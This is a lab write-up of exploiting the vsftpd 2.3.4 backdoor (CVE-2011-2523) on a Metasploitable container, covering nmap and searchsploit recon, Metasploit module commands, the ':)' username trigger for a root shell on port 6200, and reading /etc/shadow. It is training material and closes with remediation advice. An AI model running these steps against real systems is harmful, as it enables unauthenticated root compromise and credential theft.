# Lab — vsftpd 2.3.4 Backdoor Exploitation

**CVE:** CVE-2011-2523
**Service:** vsftpd 2.3.4
**Target:** Docker-based Metasploitable environment
**Vulnerability Type:** Backdoor / Unauthenticated RCE
**Criticality:** Critical

---

## Phase Recon

Full port and service scan against the target:

```bash
nmap -sS -sV 192.168.xx.xx
```

Among the many open ports, the FTP service was identified:

```
21/tcp  open  ftp     vsftpd 2.3.4
```

Service version detection (`-sV`) immediately flagged the exact version. Cross-referencing with known vulnerabilities:

```bash
searchsploit vsftpd 2.3.4
```

Returned a critical finding — vsftpd 2.3.4 contains a **deliberate backdoor** introduced via a supply chain compromise of the official source distribution in 2011. When a username containing `:)` is submitted during FTP login, the backdoor opens a root shell on **port 6200**.

---

## Phase Exploit

Loaded the Metasploit module:

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target IP>
set RPORT 21
run
```

No credentials required. The module triggers the backdoor by sending the crafted username, then connects to port 6200 and catches the resulting shell.

Shell landed immediately as `root` — no privilege escalation required.

---

## Post-Exploitation

Confirmed access:

```bash
whoami
# root

cat /etc/shadow
# Password hashes for all system accounts — redacted
```

The `/etc/shadow` file was fully readable, demonstrating complete system compromise. Password hashes could be extracted for offline cracking.

---

## Criticality Assessment

**Rating: Critical**

In a real-world business environment this vulnerability would represent a catastrophic exposure:

- **Unauthenticated** — no credentials needed to trigger
- **Remote** — exploitable over the network with no physical access
- **Instant root** — attacker lands with the highest privilege level immediately
- **Data exposure** — full access to `/etc/shadow`, configuration files, and all data on the system
- **Lateral movement** — cracked credentials could enable further access across the network

Any system running vsftpd 2.3.4 should be considered fully compromised. Immediate remediation: upgrade to a patched version, audit the system for persistence mechanisms, and rotate all credentials.

---

## Key Takeaways

- Always run `-sV` during Nmap scans — exact version numbers are the direct path to searchsploit results
- Supply chain attacks (a backdoor inserted into a legitimate software release) are a real and documented threat vector — this CVE is a textbook example
- A single outdated service version on one open port can mean full system compromise
- `searchsploit` cross-referencing should be a reflex after every service version is identified
